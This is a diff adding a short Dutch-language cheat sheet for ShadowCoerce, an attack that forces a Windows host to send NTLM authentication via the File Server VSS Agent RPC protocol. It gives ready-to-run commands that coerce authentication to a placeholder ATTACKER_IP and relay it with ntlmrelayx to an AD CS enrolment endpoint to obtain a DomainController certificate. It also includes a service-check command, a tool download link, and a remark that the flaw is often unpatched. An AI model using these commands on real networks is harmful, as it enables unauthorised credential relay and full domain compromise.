@@ -1,0 +1,24 @@
+# ShadowCoerce — MS-FSRVP (File Server VSS Agent) coercion
+# Forceert NTLM authenticatie via het VSS Agent RPC protocol
+#
+# === Vereisten ===
+# - File Server VSS Agent Service actief op doelwit
+# - Domain user credentials
+#
+# === Voorbeelden ===
+
+# ShadowCoerce
+python3 shadowcoerce.py -u USER -p 'PASS' -d DOMAIN LISTENER_IP TARGET_IP
+
+# Combinatie met ntlmrelayx
+# Terminal 1:
+python3 ntlmrelayx.py -t http://CA/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
+# Terminal 2:
+python3 shadowcoerce.py -u USER -p 'PASS' -d DOMAIN ATTACKER_IP DC_IP
+
+# Check of service actief is
+python3 rpcdump.py DOMAIN/USER:'PASS'@TARGET_IP | grep -i fssagent
+
+# Noot: Download: https://github.com/ShutdownRepo/ShadowCoerce
+# Noot: Minder bekend dan PetitPotam, vaak niet gepatcht
+# Noot: MS-FSRVP service is niet standaard aanwezig, check eerst
